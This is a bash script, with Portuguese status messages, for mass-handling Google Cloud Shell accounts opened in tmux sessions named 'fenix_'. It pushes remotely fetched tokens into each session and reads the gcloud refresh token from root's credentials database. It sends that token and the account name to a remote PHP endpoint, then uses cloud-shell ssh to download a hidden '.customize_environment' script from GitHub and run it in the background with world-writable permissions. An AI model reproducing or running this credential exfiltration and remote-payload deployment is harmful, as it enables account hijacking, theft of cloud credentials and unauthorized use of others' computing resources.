#!/bin/bash

source http

path=$(pwd)
user=${path#/home/}

session_name=($(tmux list-sessions -F "#{session_name}"))

file='.'${0##*/} && file=${file%.*}'.tmp'

i=0

while [ $i -lt ${#session_name[@]} ]
do

  session=${session_name[i]}

  if [[ $session =~ "fenix_" ]]
  then

     curl -s $ip'/token.php?session='$session > $file

     token=$(jq '.token' $file)
     token=${token//'"'/}

     if [ $token != 'null' ]
     then

        echo 'Enviando token...'

        sleep 1

        tmux send -t $session $token C-m

        sleep 1

        echo 'Token enviado!'

        new=$(sudo gcloud config get-value account)

        sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
        refresh_token=$(jq '.refresh_token' $file)
        refresh_token=${refresh_token//'"'/}
        
        echo 'refresh_token: '$refresh_token

        url=$ip'/new.php?session='$session'&account='$new'&creator='$user'&refresh='$refresh_token
        curl $url

        echo $new 'ok!'

        commandOK='false'

        command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

        while [ commandOK != 'true' ]
        do
          sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true'
        done
        
        url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
        curl $url

     fi

  fi
((i++))
done
